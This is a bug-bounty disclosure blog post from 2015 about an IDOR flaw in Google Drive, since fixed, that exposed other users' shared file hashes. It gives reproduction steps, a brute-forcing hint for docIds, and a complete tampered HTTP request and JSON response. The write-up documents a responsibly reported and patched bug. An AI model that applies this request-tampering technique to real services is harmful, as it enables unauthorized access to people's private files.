---
title: "Google Drive Information Leak"
date: 2015-07-07T00:21:44+00:00
url: "/google-drive-information-leak/"
draft: false
description: "Google Drive & Gmail attachments Leak This part of Google bounty program [IDOR] exploit to allow the attacker to leak your Google Drive files and this mean..."
categories: ["Bash", "exploit-dev", "Security", "tech", "Web"]
---

## Google Drive & Gmail attachments Leak

This part of Google bounty program

[IDOR] exploit to allow the attacker to leak your Google Drive files

and this mean attacker could leak Gmail attachments that uploaded to Google Drive, Photos you shared with Gmail or any other third party

here is the none technical product flow

you go to google drive  and upload a file  then u decided to **share** it with example@domain.com, Google will generate a hash of 28 char for the uploaded file and include this hash in the email u send it to exmaple@domain.com

 

the exploit reproduction steps :

1.open drive.google.com and login
2.intercept traffic to POST https://drive.google.com/act
3.replace docId parameter with any docId
4.api will respond u with documents list of the targeted dockId and hashes !!!

 

docId is kinda unique Id for each google drive account

example of ids
0ALWQPi6NE9vbUk9PVA
0ALEF_Oqt-UCPUk9PVA
0ANqT87FNEYawUk9PVA
as you notice it all starts with **0A** and ends **Uk9PVA** there is kind of sequence here and it easy to be brute-forced

the malformed  request

```
POST https://drive.google.com/act HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
X-Json-Requested: true
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Referer: https://drive.google.com/drive/my-drive
Content-Length: 126
Cookie: PREF=ID=b86ff659ddb4f293:U=9520ad275332970e:FF=0:LD=ar:TM=1421861394:LM=1429732012:S=L_jczGoV7pfoQrN-; NID=67=YuE_MChJNjd14qFGBRybAYDvMEctc9bXnitIXBQe5t0ntTmgaC9W2lAHqBRnNkHIH7IKPRJMDVMdVd4gtz5WY0hx2a8FTRkmhVFbbL68TNZCxk2HQ_bgqCOxNNkV65SGdFA07pYQl-fNY3My1HdP6IpsAP9WUvCEjZX6modmPhm7caL2bFb0n8xgve-TA9eVRQ; SID=DQAAACEBAABBMe7zBk0du9E2_1r6d5x5PqwmctJotPAKODoLt7pDkkWc92YIIVepaK1a2iOGscqlGGCuYOe2t-o67Z74iil5xh9ckG68ldlF8xpr7FhXZ2lcNix-_XhXfq7ll3cjksCh_H6lAI_J_TaeSLk9Ew_UPE3TafRFPnZeGkJgPpzliI5L3KRUSWQpfX9sESVIFf4MLSUIZ66vv6zVJCzwIJFknmRUbtEOlCw8NdLoF9v_J1yJx1scgzidFr_emoDe1tFWltypCFvOLJCP_n4aeVM0D4osL7nXSym6fOyF5ves3VWlI7DxRn-Ewm1v8xmfnR7ZCjVEnkCRw4OcGPeMEFDnnrG_K0gvwxsHAioGlr_2iegiteM-JuiiRBBX2--XIXNIIwCKF_24Kty9Sym_D0pI; HSID=Aijvzn_W0cQacjvTr; SSID=APhuejtuEeUVx4W02; APISID=2BeFup5TfAZl8QQU/A7xo0KZj8O6QTLmzm; SAPISID=8TV-1WWzHVGRMZuP/AJV1u0CzdCfGeVMR9; S=explorer=sbW-MmlidjDKQNv366u02g; llbcs=0
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Host: drive.google.com

docId=0ALWQPi6NE9vbUk9PVA&recursive=true&minResultCount=20&token=AC4w5VjjDMFYZr0bo9_cpLx6Oy0aEnJXmA%3A1429731987014&authuser=0
```

 

google drive will respond with a JSON file contents the files shared via your account

example of respond

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Date: Wed, 22 Apr 2015 20:30:02 GMT
Content-Disposition: attachment; filename="json.txt"; filename*=UTF-8''json.txt
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Server: GSE
Alternate-Protocol: 443:quic,p=1
Accept-Ranges: none
Vary: Accept-Encoding

)]}'
{"response":{"responseProto":"[[[10,[10,17]\n,[[,\"your account name\",,\"/c/u/0/photos/public/AIbEiAIAAABDCJiYhtHyMjM4NmM2OGNmZDRmNGE1MGJlZjc0MjEwAVqfc0bKHpR_jFdOwvo2PfoUjlxW\",,\"07075400765864628005\"]\n]\n,[[\"0B7WXP883E9vbX1CBZWtaemtPNXM\",\"20140121_130143.jpg\",\"image/jpeg\"]\n]\n,,,,,,,,,,[,,,,1]\n,,0]\n]\n,,59807321897]\n"}}
```

 

as you notice here

[\"0B7WXP883E9vbX1CBZWtaemtPNXM\",\"20140121_130143.jpg\",\"image/jpeg\"]

0B7WXP883E9vbX1CBZWtaemtPNXM anyone with this hash could access this file 20140121_130143.jpg

you will be able to access this file via this link https://drive.google.com/file/d/0B7WXP883E9vbX1CBZWtaemtPNEM/

exploit report at Apr 22 2015
exploit fixed at Apr 30 2015
docId hash improved May 7 2015

 

with 3133.7 $ bounty
